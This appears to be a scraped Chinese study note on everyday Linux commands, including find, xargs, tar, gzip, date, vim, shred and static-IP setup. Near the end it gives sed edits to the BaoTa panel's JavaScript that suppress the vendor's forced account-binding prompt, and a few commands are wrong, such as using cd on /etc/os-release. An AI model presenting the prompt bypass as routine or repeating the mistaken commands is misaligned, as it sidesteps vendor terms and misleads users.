加上感叹号，后面接条件，代表取除了文件夹以外类型\n\n\n\n# 根据权限查找\n\n[root@pylinux opt]# find . -maxdepth 2  -perm 755 -type f  #寻找权限类型是755的文件\n\n\n\n# 按照文件大小查\n\n[root@pylinux opt]# du -h `find . -maxdepth 2 -size +10M`        #找出超过10M大小的文件\n14M    ./Python-3.7.3/python\n24M    ./Python-3.7.3/libpython3.7m.a\n322M    ./s21-centos-vim.tar.gz\n\n\n# 查找文件时忽略目录\n\n[root@pylinux s18tngx]# find . -path "./conf.d" -prune -o -name "*.conf" -print\n\n\n\n# 根据用户组匹配\n\n[root@pylinux home]# find / -maxdepth 3 -group yu        #全局搜索深度为3，用户组是yu的文件\n/home/yu\n/home/yu/.bashrc\n/home/yu/.bash_profile\n/home/yu/.bash_history\n/home/yu/.cache\n/home/yu/.bash_logout\n/home/yu/.config\n\n\n\n# 使用-exec或是-ok再次处理\n\n> -ok比-exec更安全，存在用户提示确认\n\n#找出以.txt结尾的文件后执行删除动作且确认\n[root@pylinux opt]# find /opt/luffy_boy  -type f -name "*.txt" -ok  rm  {}  \\;\n\n备注\n-exec 跟着shell命令，结尾必须以;分号结束，考虑系统差异，加上转义符\\;\n{}作用是替代find查阅到的结果\n{}前后得有空格\n#找到目录中所有的.txt文件，且将查询结果写入到all.txt文件中\n[root@pylinux opt]# find ./mydj2/ -type f -name "*.txt" -exec cat {} \\; > all.txt\n#把30天以前的日志，移动到old文件夹中\nfind . -type f -mtime +30 -name "*.log" -exec cp {} old \\;\n\n\n\n\n# xargs命令\n\n> xargs 又称管道命令，构造参数等。 是给命令传递参数的一个过滤器,也是组合多个命令的一个工具它把一个数据流分割为一些足够小的块,以方便过滤器和命令进行处理 。 简单的说就是把其他命令的给它的数据，传递给它后面的命令作为参数\n\n-d 为输入指定一个定制的分割符，默认分隔符是空格\n-i 用 {} 代替 传递的数据\n-I string 用string来代替传递的数据-n[数字] 设置每次传递几行数据\n-n 选项限制单个命令行的参数个数\n-t 显示执行详情\n-p 交互模式\n-P n 允许的最大线程数量为n\n-s[大小] 设置传递参数的最大字节数(小于131072字节)\n-x 大于 -s 设置的最大长度结束 xargs命令执行\n-0，--null项用null分隔，而不是空白，禁用引号和反斜杠处理\n\n\n\n案例\n\n多行输入变单行\n\n[root@luffycity tmp]# cat mjj.txt\n1 2 3 4\n5 6 7 8\n9 10\n[root@luffycity tmp]# xargs < mjj.txt\n1 2 3 4 5 6 7 8 9 10\n-n参数限制每行输出个数\n\n[root@luffycity tmp]# xargs -n 3 < mjj.txt        #每行最多输出3个\n1 2 3\n4 5 6\n7 8 9\n10\n自定义分隔符-d参数\n\n[root@luffycity tmp]# echo "alex,alex,alex,alex,alex," |xargs -d ","\nalex alex alex alex alex\n\n#定义分隔符后，限制每行参数个数\n[root@luffycity tmp]# echo "alex,alex,alex,alex,alex," |xargs -d "," -n 2\nalex alex\nalex alex\nalex\n-i参数的用法，用{}替换传递的数据\n\n-I 参数用法，用string代替数据\n\n#找到当前目录所有的.txt文件，然后拷贝到其他目录下\n[root@luffycity tmp]# find . -name "*.txt" |xargs -i  cp {} heihei/\n\n[root@luffycity tmp]# find . -name "*.txt" |xargs -I data cp data  heihei/\n\n#找到当前目录下所有txt文件，然后删除\n[root@luffycity tmp]# find . -name "*.txt" |xargs -i rm -rf {}\n重点\n\nxargs识别字符串的标识是空格或是换行符，因此如果遇见文件名有空格或是换行符，xargs就会识别为两个字符串，就会报错\n\n-print0在find中表示每一个结果之后加一个NULL字符，而不是换行符（find默认在结果后加上\\n，因此结果是换行输出的）\nXargs -0 表示xargs用NULL作为分隔符\n\n\n#修改find的输出结果，-print0可以改结尾为null\n[root@luffycity tmp]# find . -name "*.txt" -print\n./hello luffycity.txt\n[root@luffycity tmp]# find . -name "*.txt" -print0\n./hello luffycity.txt[root@luffycity tmp]#\n\n\n#修改xargs，理解默认分隔符是NULL\nfind . -name "*.txt" -print0 |xargs -0 rm\n\n\n\n\n# file命令\n\n> 显示文件的类型\n\n[root@luffycity tmp]# file /usr/bin/python2.7        #二进制解释器类型\n/usr/bin/python2.7: ELF 64-bit LSB executable\n\n[root@luffycity tmp]# file /usr/bin/yum                    #yum是python的脚本文件\n/usr/bin/yum: Python script, ASCII text executable\n\n[root@luffycity tmp]# file /usr/bin/cd                #shell脚本，内置命令\n/usr/bin/cd: POSIX shell script, ASCII text executable\n\n[root@luffycity tmp]# file hehe.txt            #text类型\nhehe.txt: ASCII text\n\n[root@luffycity tmp]# file heihei            #文件夹\nheihei: directory\n\n[root@luffycity tmp]# file /usr/bin/python2            #软链接类型\n/usr/bin/python2: symbolic link to `python2.7\'\n\n\n\n\n# which\n\n> 查找PATH环境变量中的文件，linux内置命令不在path中\n\n[root@luffycity tmp]# which python\n/usr/bin/python\n\n\n\n# whereis命令\n\n> whereis命令用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。\n\n[root@luffycity tmp]# whereis python\npython: /usr/bin/python /usr/bin/python2.7 /usr/lib/python2.7 /usr/lib64/python2.7 /etc/python /usr/include/python2.7 /usr/share/man/man1/python.1.gz\n\n\n\n\n# tar命令\n\n> tar命令在linux系统里，可以实现对多个文件进行，压缩、打包、解包\n\n打包\n\n将一大堆文件或目录汇总成一个整体。\n\n压缩\n\n将大文件压缩成小文件，节省磁盘空间。\n\n\n\n语法：\ntar(选项)(参数)\n\n-A或--catenate：新增文件到以存在的备份文件；\n-B：设置区块大小；\n-c或--create：建立新的备份文件；\n-C <目录>：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。\n-d：记录文件的差别；\n-x或--extract或--get：从备份文件中还原文件；\n-t或--list：列出备份文件的内容；\n-z或--gzip或--ungzip：通过gzip指令处理备份文件；\n-Z或--compress或--uncompress：通过compress指令处理备份文件；\n-f<备份文件>或--file=<备份文件>：指定备份文件；\n-v或--verbose：显示指令执行过程；\n-r：添加文件到已经压缩的文件；\n-u：添加改变了和现有的文件到已经存在的压缩文件；\n-j：支持bzip2解压文件；\n-v：显示操作过程；\n-l：文件系统边界设置；\n-k：保留原有文件不覆盖；\n-m：保留文件不被覆盖；\n-w：确认压缩文件的正确性；\n-p或--same-permissions：用原来的文件权限还原文件；\n-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；不建议使用\n-N <日期格式> 或 --newer=<日期时间>：只将较指定日期更新的文件保存到备份文件里；\n--exclude=<范本样式>：排除符合范本样式的文件。\n-h, --dereference跟踪符号链接；将它们所指向的文件归档并输出\n案例\n\n仅打包，不压缩\n\n#tar 参数 包裹文件名  需要打包的文件\n[alex@luffycity tmp]$ tar -cvf alltmp.tar ./*\n打包后且用gzip命令压缩，节省磁盘空间\n\n[alex@luffycity tmp]$ tar -zcvf alltmp.tar ./*\n注意\n\nf参数必须写在最后，后面紧跟压缩文件名\ntar命令仅打包，习惯用.tar作为后缀\ntar命令加上z参数，文件以.tar.gz或.tgz表示\n列出tar包内的文件\n\n#根据tar包文件后缀，决定是否添加z参数，调用gzip\n[alex@luffycity tmp]$ tar -ztvf alltmp2.tar.gz\n拆开tar包\n\n[root@luffycity tmp]# tar -xf alltmp.tar\n拆开tar的压缩包\n\ntar -zxvf ../alltmp2.tar.gz ./\n拆除tar包中部分文件\n\n#正常解压命令，单独加上你要拆除的文件名，指定路径\n#先看下tar包中有什么内容，再指定文件解压\n\n[root@luffycity tmp]# tar -ztvf ../alltmp2.tar.gz\n\n[root@luffycity tmp]# tar -zxvf ../alltmp2.tar.gz ./alltmp.tar\n./alltmp.tar\n指定目录解tar包\n\n[root@luffycity tmp]# tar -xf alltmp.tar -C /opt/data/\n排除文件解包\n\n#注意--exclude 跟着文件名或是文件夹，不得加斜杠，排除多个文件，就写多个--exclude\n[root@luffycity tmp]# tar -zxvf ../alltmp2.tar.gz   --exclude data\n打包链接文件\n\n-h参数能够保证，打包的不仅仅是个快捷方式，而是找到源文件\n\n\n打包/etc下所有普通文件\n\n[root@luffycity tmp]# tar -zcvf etc.tgz `find /etc -type f`\n[root@luffycity tmp]# tar -tzvf etc.tgz\n\n\n\n# gzip命令\n\n> 要说tar命令是个纸箱子用于打包，gzip命令就是压缩机器 gzip通过压缩算法lempel-ziv 算法(lz77) 将文件压缩为较小文件，节省60%以上的存储空间，以及网络传输速率\n\ngzip(选项)(参数)\n\n-a或——ascii：使用ASCII文字模式；\n-c或--stdout或--to-stdout 　把解压后的文件输出到标准输出设备。 \n-d或--decompress或----uncompress：解开压缩文件；\n-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；\n-h或——help：在线帮助；\n-l或——list：列出压缩文件的相关信息；\n-L或——license：显示版本与版权信息；\n-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；\n-N或——name：压缩文件时，保存原来的文件名称及时间戳记；\n-q或——quiet：不显示警告信息；\n-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-S或<压缩字尾字符串>或----suffix<压缩字尾字符串>：更改压缩字尾字符串；\n-t或——test：测试压缩文件是否正确无误；\n-v或——verbose：显示指令执行过程；\n-V或——version：显示版本信息；\n-<压缩效率>：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；\n--best：此参数的效果和指定“-9”参数相同；\n--fast：此参数的效果和指定“-1”参数相同。\n案例\n\n#压缩目录中每一个html文件为.gz,文件夹无法压缩，必须先tar打包\ngzip *.html        #gzip压缩，解压都会删除源文件\n列出压缩文件中信息\n\n[root@luffycity tmp]# gzip -l *.gz        #不解压显示压缩文件内信息，以及压缩率\n         compressed        uncompressed  ratio uncompressed_name\n                 28                   0   0.0% 10.html\n                 24                   0   0.0% 123\n                 27                   0   0.0% 1.html\n                 27                   0   0.0% 2.html\n                 27                   0   0.0% 3.html\n                 27                   0   0.0% 4.html\n                 27                   0   0.0% 5.html\n                 27                   0   0.0% 6.html\n                 27                   0   0.0% 7.html\n                 27                   0   0.0% 8.html\n                 27                   0   0.0% 9.html\n           23581672           118888884  80.2% alex.txt\n           23582535           118896640  80.2% alltmp.tar\n                289                 470  44.9% glances.log\n                 45                  16 -12.5% hehe.txt\n           47164836           237786010  80.2% (totals)\n解压缩且显示过程\n\n[root@luffycity tmp]# gzip -dv *.gz\n10.html.gz:      0.0% -- replaced with 10.html\n123.gz:      0.0% -- replaced with 123\n1.html.gz:      0.0% -- replaced with 1.html\n2.html.gz:      0.0% -- replaced with 2.html\n3.html.gz:      0.0% -- replaced with 3.html\n4.html.gz:      0.0% -- replaced with 4.html\n5.html.gz:      0.0% -- replaced with 5.html\n6.html.gz:      0.0% -- replaced with 6.html\n7.html.gz:      0.0% -- replaced with 7.html\n8.html.gz:      0.0% -- replaced with 8.html\n9.html.gz:      0.0% -- replaced with 9.html\nalex.txt.gz:     80.2% -- replaced with alex.txt\nalltmp.tar.gz:     80.2% -- replaced with alltmp.tar\nglances.log.gz:     44.9% -- replaced with glances.log\nhehe.txt.gz:    -12.5% -- replaced with hehe.txt\n压缩保留源文件\n\n#-c参数\n[root@luffycity tmp]# gzip -c  alltmp.tar > alltmp.tar.gz\ngzip套件提供了许多方便的工具命令，可以直接操作压缩文件内容\n\nzcat，直接读取压缩文件内容zcat hehe.txt.gz\nzgrep\nzless\nzdiff\n\n\n\n\n# zip命令\n\n> zip 命令：是一个应用广泛的跨平台的压缩工具，压缩文件的后缀为 zip文件，还可以压缩文件夹\n\n\n语法：\nzip 压缩文件名  要压缩的内容\n\n-A 自动解压文件\n-c 给压缩文件加注释\n-d 删除文件\n-F 修复损坏文件\n-k 兼容 DOS\n-m 压缩完毕后，删除源文件\n-q 运行时不显示信息处理信息\n-r 处理指定目录和指定目录下的使用子目录\n-v 显示信息的处理信息\n-x “文件列表” 压缩时排除文件列表中指定的文件\n-y 保留符号链接\n-b<目录> 指定压缩到的目录\n-i<格式> 匹配格式进行压缩\n-L 显示版权信息\n-t<日期> 指定压缩文件的日期\n-<压缩率> 指定压缩率\n最后更新 2018-03-08 19:33:4\n案例\n\n#压缩当前目录下所有内容为alltmp.zip文件\n[root@luffycity tmp]# zip alltmp.zip ./*\n\n#压缩多个文件夹\n[root@luffycity tmp]# zip -r data.zip ./data ./data2\nunzip命令用于解压\n\n参数\n\n-l：显示压缩文件内所包含的文件；\n-d<目录> 指定文件解压缩后所要存储的目录。\n案例\n\n#查看压缩文件内容\n[root@luffycity tmp]# unzip -l data.zip\n\n#解压缩zip文件\n[root@luffycity tmp]# unzip data.zip\n\n\n\n# date命令\n\n> date命令用于显示当前系统时间，或者修改系统时间\n\n语法\n\ndate  参数   时间格式\n\n参数\n\n-d, --date=STRING\n    显示由 STRING 指定的时间, 而不是当前时间 \n\n-s, --set=STRING\n    根据 STRING 设置时间 \n\n-u, --utc, --universal\n    显示或设置全球时间(格林威治时间)\n时间格式\n\n%%\n    文本的 % \n%a\n    当前区域的星期几的简写 (Sun..Sat) \n%A\n    当前区域的星期几的全称 (不同长度) (Sunday..Saturday) \n%b\n    当前区域的月份的简写 (Jan..Dec) \n%B\n    当前区域的月份的全称(变长) (January..December) \n%c\n    当前区域的日期和时间 (Sat Nov 04 12:02:33 EST 1989) \n%d\n    (月份中的)几号(用两位表示) (01..31) \n%D\n    日期(按照 月/日期/年 格式显示) (mm/dd/yy) \n%e\n    (月份中的)几号(去零表示) ( 1..31) \n%h\n    同 %b \n%H\n    小时(按 24 小时制显示，用两位表示) (00..23) \n%I\n    小时(按 12 小时制显示，用两位表示) (01..12) \n%j\n    (一年中的)第几天(用三位表示) (001..366) \n%k\n    小时(按 24 小时制显示，去零显示) ( 0..23) \n%l\n    小时(按 12 小时制显示，去零表示) ( 1..12) \n%m\n    月份(用两位表示) (01..12) \n%M\n    分钟数(用两位表示) (00..59) \n%n\n    换行 \n%p\n    当前时间是上午 AM 还是下午 PM \n%r\n    时间,按 12 小时制显示 (hh:mm:ss [A/P]M) \n%s\n    从 1970年1月1日0点0分0秒到现在历经的秒数 (GNU扩充) \n%S\n    秒数(用两位表示)(00..60) \n%t\n    水平方向的 tab 制表符 \n%T\n    时间,按 24 小时制显示(hh:mm:ss) \n%U\n    (一年中的)第几个星期，以星期天作为一周的开始(用两位表示) (00..53) \n%V\n    (一年中的)第几个星期，以星期一作为一周的开始(用两位表示) (01..52) \n%w\n    用数字表示星期几 (0..6); 0 代表星期天 \n%W\n    (一年中的)第几个星期，以星期一作为一周的开始(用两位表示) (00..53) \n%x\n    按照 (mm/dd/yy) 格式显示当前日期 \n%X\n    按照 (%H:%M:%S) 格式显示当前时间 \n%y\n    年的后两位数字 (00..99) \n%Y\n    年(用 4 位表示) (1970...) \n%z\n    按照 RFC-822 中指定的数字时区显示(如, -0500) (为非标准扩充) \n%Z\n    时区(例如, EDT (美国东部时区)), 如果不能决定是哪个时区则为空 \n\n默认情况下,用 0 填充数据的空缺部分. GNU 的 date 命令能分辨在 `%\'和数字指示之间的以下修改.\n\n    `-\' (连接号) 不进行填充 `_\' (下划线) 用空格进行填充\n案例\n\n显示当前系统部分时间\n\n1.显示短年份\ndate +%y\n\n2.显示长年份\ndate +%Y\n\n3.显示月份\ndate +%m\n\n4.显示几号\ndate +%d\n\n5.显示几时\ndate +%H\n\n6.显示几分\ndate +%M\n\n7.显示整秒\ndate +%S\n\n8.显示时间如，年-月-日\ndate +%F\n\n9.显示时间如，时：分：秒\ndate +%T\n-d参数指定时间显示，仅仅是显示\n\n1.显示昨天\n date +%F -d "-1day"\n\n2.显示昨天\ndate +%F -d "yesterday"\n\n3.显示前天\ndate +%F -d "-2day"\n\n4.显示明天日期\ndate +%F -d "+1day"\n\n5.显示明天，英文表示\ndate +%F -d "tomorrow"\n\n6.显示一个月之前，之后\n[root@pylinux /]# date +%F -d "1month"\n2019-12-01\n[root@pylinux /]# date +%F -d "-1month"\n2019-10-01\n\n7.显示一年后\ndate +%F -d "1year"\n\n8.显示60分钟后\ndate +%T -d "60min"\n\n\n+表示未来\n-表示过去\nday表示日\nmonth表示月份\nyear表示年\nmin表示分钟\n-s设置时间\n\n设置时间较少，一般配置ntp时间服务器\n\n1.设置时间\n[root@pylinux /]# date -s "20170808"\n2017年 08月 08日 星期二 00:00:00 CST\n[root@pylinux /]#\n[root@pylinux /]# date\n2017年 08月 08日 星期二 00:00:00 CST\n\n\n\n2.修改分钟\n[root@pylinux /]# date -s "05:06:33"\n2017年 08月 08日 星期二 05:06:33 CST\n[root@pylinux /]# date\n2017年 08月 08日 星期二 05:06:33 CST\n\n\n3.修改日期和分钟\n[root@pylinux /]# date -s "20180606 05:30:30"\n2018年 06月 06日 星期三 05:30:30 CST\n[root@pylinux /]# date\n2018年 06月 06日 星期三 05:30:31 CST\n\n4.可设置不同格式的时间\ndate -s "2018-06-06 05:30:30"\ndate -s "2018/07/07 05:30:30"\n\n\n# Linux开关机命令\n\n命令                说明\nshutdown -h now   立刻关机，企业用法\nshutdown -h 1     1分钟后关机，也可以写时间如 11:30\nhalt              立刻关闭系统，需手工切断电源\ninit 0            切换运行级别为0，0表示关机\npoweroff          立刻关闭系统，且关闭电源\n重启                \nreboot            立刻重启机器，企业用法\nShutdown -r now   立刻重启，企业用法\nshutdown -r 1     一分钟后重启\nInit 6            切换运行级别为6，此级别是重启\n注销命令              \nlogout            注销退出当前用户\nexit              注销退出当前用户，快捷键ctrl + d\n\n# Linux命令行常用快捷键\n\nctrl + c     cancel取消当前操作\nctrl + l    清空屏幕内容\nctrl + d    退出当前用户\nctrl + a     光标移到行首\nctrl + e    光标移到行尾\nctrl + u  删除光标到行首的内容\n\n\n\n\n# 虚拟机的ip配置\n\nVMnet8 更改\n虚拟机->编辑->更改设置->NAT模式打勾-> 将主机虚拟适配器连接到此网路\n\n创建虚拟的网卡ip\n子网ip 192.168.178.0 子网掩码255.255.255.0\n\n-> Nat 设置 网关ip 常用为192.168.178.254\n\n\n查看ip \nip addr show\n\nvi /etc/sysconfig/network-scripts/ifcfg-ens33\n\ni为编写\n\n修改为\n\n\nTYPE="Ethernet"\nPROXY_METHOD="none"\nBROWSER_ONLY="no"\nBOOTPROTO="static"    --静态\nDEFROUTE="yes"\nIPV4_FAILURE_FATAL="no"\nIPV6INIT="yes"\nIPV6_AUTOCONF="yes"\nIPV6_DEFROUTE="yes"\nIPV6_FAILURE_FATAL="no"\nIPV6_ADDR_GEN_MODE="stable-privacy"\nNAME="ens33"\nUUID="7264e0dc-167c-4f01-b12b-40365a63c45d"\nDEVICE="ens33"\nONBOOT="yes"   --设置自动开启\nIPADDR=192.168.178.110  --设置统一网段的开启\nNETMASK=255.255.255.0 --网编码\nGATEWAY=192.168.178.254  --网关\nDNS1=119.29.29.29  dns1 腾讯的\n\n\n按键esc 取消\n输入 :wq! 保存当前编写\n\nsystemctl stop NetworkManager 停止有线服务\nsystemctl restart network\n重启有线服务\n\n按下clat+alt -f1-f7 //切换终端\n\npasswd  //修改root密码\n\n\nssh root@192.168.11.45  //登录\nssh 登录的用户名@主机名\n\n\n\n# shred命令\n\n用法：shred [选项]... 文件...\n\n多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原。\n\n-u, --remove 覆盖后截断并删除文件\nshred heihei.txt  随机覆盖文件内容，不删除源文件\n\n\n案例\n\n彻底粉碎且删除文件\n\n[root@pylinux tmp]# ls -lh\n总用量 25M\n-rw-r--r-- 1 root root 25M 10月 14 15:02 heihei.txt\n[root@pylinux tmp]#\n[root@pylinux tmp]# shred -u heihei.txt\n\n\n\n508 0.9\n\n\n# 修改宝塔面板的登录提示\n\n> 先安装宝塔，如果登陆啥事都没有那最好，如果提示必须要登陆宝塔账户。 那么，在terminal里执行：\n\n * bt default\n\nsed -i "s|if (bind_user == \'True\') {|if (bind_user == \'REMOVED\') {|g" /www/server/panel/BTPanel/static/js/index.js\n全选代码复制\n完工。\n\n\n同理，如果要还原\n\nsed -i "s|if (bind_user == \'REMOVED\') {|if (bind_user == \'True\') {|g" /www/server/panel/BTPanel/static/js/index.js\n全选代码复制\n手动修改\n\n\n/www/server/panel/BTPanel/static/js/index.js\n\n找到这个文件，搜索\n\nbind_user\n\n把\n\nif (bind_user == \'True\') {\nshow_force_bind();\n}\n全选代码复制\n改成\n\nif (bind_user == \'REMOVED\') {\nshow_force_bind();\n}\n全选代码复制\n需要还原就改成上面那个就可以了。\n\n这样就可以去除宝塔的强制登陆提示了\n\n\ndocker run -id --name jenkins -p 8080:8080 -v /home/data/jenkins:/var/jenkins_home jenkins/jenkins:lts',normalizedContent:'# linxu简单命令学习\n\n\n# 命令\n\nshutdown -h now//正常关机\nhalt //关闭内存\ninit 0 //\nlogout //退出登录\n \n\nls //查看当前的文件\n    白色的为普通文件 --  蓝色为文件夹\npwd 为当前的文件路径\n\ntouch 新建文件\nvim /etc/motd  //修改登录界面\ncd /etc/os-release  //查看系统呃版本号\nsu lwz 用户切换\n\n\n\n\n\n# linux命令行\n\n命令           空格   参数（可写可不写）              空格   文件，文件夹\nls列出文件夹的内容                                    /data 根目录下的data文件夹\nls                -a all 列出所有的文件以及隐藏文件        /data\nls                -a                          如果不写输入当前的文件\nls                                            输入当前的文件\nls                -a                          -l 查询更详细的文件\n\n> 基本的命令如上\n\n * 一般情况下，linux命令的参数都是可选的，可写可不写，不同的参数作用也不一样。\n * linux 命令行之间，必须得有多个空格。\n\n\n# linux 提示符\n\n * whoami 我是谁，显示当前的用户\n * hostname 显示当前的主机名\n * pwd 显示当前的路径\n * \n\n命令提示符\n[py@pylinux ~]$            普通用户py，登陆后\n\n[root@pylinux ~]#        超级用户root，登录后\n\nroot代表当前登录的用户\n\n@ 分隔符\n\npylinux 主机名\n\n~  当前的登录的位置，此时是家目录\n\n# 超级用户身份提示符\n$ 普通用户身份提示符\n\n\n\n\n# linux 文件及目录管理命令\n\n命令         作用\ncat        查看文件\nvim        打开文件\ni          插入编辑\n:wq!       强制保存并退出\n:q!        强制退出不保存\n:wq        保存并退出\ncd 目录名     切换文件夹\ntouch文件名   如果文件不存在就创建文件\nmkdir目录名   创建目录\nrm         文件名\n\n# cd 命令 变换目录\n\n * . 当前目录\n * .. 上一层目录\n * * 前一个工作目录\n * ~ 当前用户所在的家的目录\n * / 顶级根目录\n * \n\n# ls 命令\n\n * -a 显示指定目录下所有子目录与文件，包括以.开头的隐藏文件\n\n * -l 以列表方式显示文件的详细信息 ls -l 等于ll 用法\n\n * -h, --human-readable 与-l 一起，以易于阅读的格式输出文件大小 (例如 1k 234m 2g)\n\n * -t 根据最后修改时间排序，默认是以文件名排序，通常与-l 连用\n\n * -f 在条目后加上文件类型的指示符号(* ， /， = ， @ ， | ，其中的一个)\n   \n   * 注:可以标识文件类型\n   * 加上 * 代表可执行的普通文件\n   * 加上 = 表示套接字\n   * 加上 | 表示fifos(队列系统)\n   * 加上 @表示符号链接\n   * 加上 / 表示文件夹\n\n * -d 显示目录本身的信息 而不是显示目录的内容\n\n * -r, --reverse 逆序排列\n\n * -s 根据文件大小排序,从大到小排序\n\n * -i 显示索引节点信息(索引节点相当于身份证号)\n\n * --full-time 以完整的时间格式输出(也就是按照中国的时间日期显示)\n\n# mkdir命令\n\n> 创建文件夹\n\n * 用法：mkdir [选项]... 目录...\n\n * 若指定目录不存在则创建目录。\n\n * -m, --mode=模式 设置权限模式(类似chmod)，而不是rwxrwxrwx 减umask\n\n * -p, --parents 需要时创建目标目录的上层目录，但即使这些目录已存在也不当作错误处理\n\n * mkdir {1..3}加花括号创建连续的目录，用..隔开 花括号内可以是连续的数字、连续的字母mkdir {a..e}\n\n# touch命令\n\n> 创建文件或修改文件时间戳\n\n用法：touch [选项]... 文件...\n将每个文件的访问时间和修改时间改为当前时间。\n\n不存在的文件将会被创建为空文件，除非使用-c 或-h 选项。\n\ntouch {连续数字或字母} 创建多个文件序列\ntouch {1..10}创建文件或修改文件时间戳\n\ntouch {a..z}\n\n  -c, --no-create       不创建任何文件\n  -t stamp              使用[[cc]yy]mmddhhmm[.ss] 格式的时间替代当前时间\n  -r, --reference=文件  使用指定文件的时间属性替代当前文件时间\n\n\n\n# cp复制\n\n\n用法：cp [选项]... [-t] 源文件 目标文件\n　或：cp [选项]... 源文件... 目录\n　或：cp [选项]... -t 目录 源文件...\n将源文件复制至目标文件，或将多个源文件复制至目标目录。\n\n-r 递归式复制目录，即复制目录下的所有层级的子目录及文件 -p 复制的时候 保持属性不变\n-d 复制的时候保持软连接(快捷方式)\n-a 等于-pdr\n-p                等于--preserve=模式,所有权,时间戳，复制文件时保持源文件的权限、时间属性\n-i, --interactive        覆盖前询问提示\n\n\n# mv命令\n\n\nmv命令就是move的缩写，作用是移动或是重命名文件\n\n用法：mv [选项]... [-t] 源文件 目标文件\n　或：mv [选项]... 源文件... 目录\n　或：mv [选项]... -t 目录 源文件...\n将源文件重命名为目标文件，或将源文件移动至指定目录。\n\n-f, --force                  覆盖前不询问\n-i, --interactive            覆盖前询问\n-n, --no-clobber             不覆盖已存在文件如果您指定了-i、-f、-n 中的多个，仅最后一个生效。\n-t, --target-directory=directory      将所有参数指定的源文件或目录移动至 指定目录\n-u, --update                  只在源文件文件比目标文件新，或目标文件不存在时才进行移动\n\n\n\n# rm 命令\n\n用法：rm [选项]... 文件...\n删除 (unlink) 文件。\n\nrm命令就是remove的含义，删除一个或者多个文件，这是linux系统重要命令\n-f, --force           强制删除。忽略不存在的文件，不提示确认\n-i                    在删除前需要确认\n-i                    在删除超过三个文件或者递归删除前要求确认。\n-d, --dir    删除空目录\n-r, -r, --recursive   递归删除目录及其内容\n-v, --verbose         详细显示进行的步骤\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n       \n\n\n\n# linux帮助命令\n\n语法\nman 命令  \n\n如：\nman  ls  \n\n进入man帮助文档后，按下q退出\n\n\n语法：\n命令 --help\n\n帮助命令的精简版\n如 ls --help\n\n\n语法：\nhelp  命令  \n\n只针对bash内置命令\n\n\n语法：\ninfo 命令\n\n\n\n# vim命令\n\n# vim基础用法\n\n * vi oldboy.txt #打开文件\n * 打开后无法直接编辑，需要按 i 进入编辑模式\n * 修改这个文件内容吧\n * 修改完后，按 esc 退出编辑模式:wq\n * 保存退出 #注意":"必须是英文符号 :wq 保存并退出 :q! 强制退出不保存 :wq! 强制保存退出\n\n# 移动光标\n\nw(e)　　移动光标到下一个单词\nb　　　　移动到光标上一个单词\n\n数字0　　移动到本行开头\n$　　　　移动光标到本行结尾\n\nh　　　　移动光标到屏幕首行\nm　　　　移动到光标到屏幕的中间一行\nl　　　　移动光标到屏幕的尾行\ngg　　　 移动光标到文档的首行\ng　　　　移动光标到文档尾行\n\nctrl + f　　下一页\nctrl + b　　上一页\n\n`.　　移动光标到上一次的修改行\n\n\n# 查找\n\n/chaoge     在整篇文档中搜索chaoge字符串,向下查找\n?chaoge     在整篇文档中搜索chaoge字符串,向上查找\n\n*        查找整个文档，匹配光标所在的所有单词,按下n查找下一处,n上一处\n#        查找整个文档，匹配光标所在的所有单词,按下n查找下一处,n上一处\n\ngd        找到光标所在单词匹配的单词，并停留在非注释的第一个匹配上\n\n%　　　　找到括号的另一半！！\n\n\n# 复制、删除、粘贴\n\nyy    拷贝光标所在行\ndd    删除光标所在行\nd     删除当前光标到行尾的内容\ndg    删除当前行到文档尾部的内容\np     粘贴yy所复制的内容\nx　　  向后删除字符\nx     先前删除字符\nu     撤销上一步的操作\n.       重复前一个执行过的动作\n\n\n# 数字与命令\n\n3yy　　　　拷贝光标所在的3行\n5dd　　　　删除光标所在5行\n\n\n# 快捷操作\n\n删除光标所在位置到行尾的内容并进入编辑模式 c(大写字母)\n在命令模式下按下字母i，即可进入输入模式，可以编写代码啦。。。\n在当前行下面插入一行并进入编辑模式 o(小写字母)\n在当前行上面插入一行并进入编辑模式 o(大写字母)\n快速到达行尾并进入编辑模式 a\n快速保存并退出 zz\n\n\n# 批量快捷操作\n\n批量删除:\n进入批量编辑模式(可视块)\nctrl+v \n选择 上下左右\n删除 d \n\n批量增加:进入批量编辑模式(可视块)ctrl+v\n选择区域\n输入大写的 i 进入编辑模式 编辑\n按下esc键\n\n批量去掉注释\n1. 进入命令行模式，按ctrl + v进入 visual block模式，按字母l横向选中列的个数，例如 // 需要选中2列\n2. 按字母j，或者k选中注释符号\n3. 按d键就可全部取消注释\n\n\n\n# vim批量缩进\n\n:set tabstop=4 设定tab宽度为4个字符\n:set shiftwidth=4 设定自动缩进为4个字符\n:set expandtab 用space替代tab的输入\n:set noexpandtab 不用space替代tab的输入\n\n1.命令模式，按下v，进入可视模式\n2.光标移动选择行，输入 > 大于号，缩进，输入< 缩进\n\n输入行号缩进：\n1.显示行号\n:set nu        #显示\n:set nonu    #关闭\n\n2.行号缩进\n:10,20 >    #10到20行，缩进一次\n\n\n> 底线命令模式\n\n在命令模式下输入冒号（英文的:），就进入了底线命令模式，在底线命令模式下可以输入单个或多个字符的命令，常用命令有：\n\n:q!     强制退出\n:wq!    强制写入退出\n:set nu 显示行号\n:数字　　调到数字那行\n:set nonu 取消显示行号\n\n随时按下esc可以退出底线命令模式\n\n\n\n# 重定向符号\n\n\n# cat命令\n\n> cat命令用于查看纯文本文件（常用于内容较少的）， 可以理解为是猫，瞄一眼文件内容 其单词是concatenate，指的是可以连接多个文件且打印到屏幕，或是重定向到文件中\n\n用法：cat [选项] [文件]...\n将[文件]或标准输入组合输出到标准输出。\n\n清空文件内容,慎用\n1.直接清空不留空行\n> 文件名\n2.直接清空留下空行\necho > gushi.txt\n3.利用cat读取一个黑洞文件，然后清空其他文本。\n/dev/null  \n\n\n-a, --show-all           等价于 -vet\n-b, --number-nonblank    对非空输出行编号\n-e                       等价于 -ve\n-e, --show-ends          在每行结束处显示 $\n-n, --number             对输出的所有行编号\n-s, --squeeze-blank      不输出多行空行\n-t                       与 -vt 等价\n-t, --show-tabs  